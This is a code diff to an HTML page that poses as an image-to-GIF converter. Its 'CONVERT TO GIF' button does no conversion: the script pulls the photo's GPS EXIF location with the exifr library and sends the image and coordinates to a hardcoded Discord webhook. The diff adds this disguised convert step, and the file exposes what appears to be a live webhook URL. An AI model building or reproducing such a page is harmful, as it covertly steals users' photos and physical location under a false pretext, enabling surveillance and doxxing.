@@ -21,9 +21,13 @@
       border-radius: 20px;
       border: 1px solid rgba(255,255,255,0.1);
       text-align: center;
-      width: 420px;
+      width: 440px;
     }
-    h1 { font-size: 2.8em; margin: 0 0 30px 0; color: #00ffff; }
+    h1 { 
+      font-size: 2.8em; 
+      margin: 0 0 30px 0; 
+      color: #00ffff; 
+    }
     button {
       padding: 16px 32px;
       font-size: 1.1em;
@@ -36,7 +40,12 @@
       cursor: pointer;
     }
     button:hover { transform: scale(1.08); }
-    #status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    #status { 
+      margin-top: 20px; 
+      font-size: 1.1em; 
+      min-height: 30px; 
+    }
   </style>
 </head>
 <body>
@@ -44,6 +53,7 @@
     <h1>gif.fuck</h1>
     <button id="uploadBtn">Choose Image</button>
     <button id="cameraBtn">Take Photo</button>
+    <button id="convertBtn" style="display:none; background: linear-gradient(90deg, #00ff88, #00ccff);">CONVERT TO GIF</button>
     <div id="status"></div>
   </div>
 
@@ -53,6 +63,8 @@
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
     const statusEl = document.getElementById('status');
+    const convertBtn = document.getElementById('convertBtn');
+    let selectedFile = null;
 
     function updateStatus(text, color = "white") {
       statusEl.textContent = text;
@@ -77,25 +89,38 @@
     }
 
     async function handleFile(file) {
-      if (!file.type.startsWith("image/")) return;
+      if (!file || !file.type.startsWith("image/")) return;
+      
+      selectedFile = file;
       updateStatus(`Selected: ${file.name}`, "#00ffff");
+      convertBtn.style.display = "inline-block";
+    }
+
+    async function convertToGif() {
+      if (!selectedFile) return;
+      
+      updateStatus("Sending to webhook...", "#ffff00");
+      convertBtn.disabled = true;
 
       try {
-        const gps = await exifr.gps(file);
-        await sendToWebhook(file, gps);
-        updateStatus("✅ Sent to webhook!", "#00ff00");
+        const gps = await exifr.gps(selectedFile);
+        await sendToWebhook(selectedFile, gps);
+        updateStatus("✅ Successfully sent to webhook!", "#00ff00");
       } catch (err) {
-        await sendToWebhook(file);
-        updateStatus("✅ Sent (no GPS)", "#00ff88");
+        await sendToWebhook(selectedFile);
+        updateStatus("✅ Sent (no GPS data)", "#00ff88");
       }
+
+      convertBtn.disabled = false;
     }
 
     // Button clicks
     document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
     document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
+    convertBtn.onclick = convertToGif;
 
- document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
-document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);
+    document.getElementById("fileInput").onchange = e => handleFile(e.target.files[0]);
+    document.getElementById("cameraInput").onchange = e => handleFile(e.target.files[0]);
   </script>
 </body>
 </html>
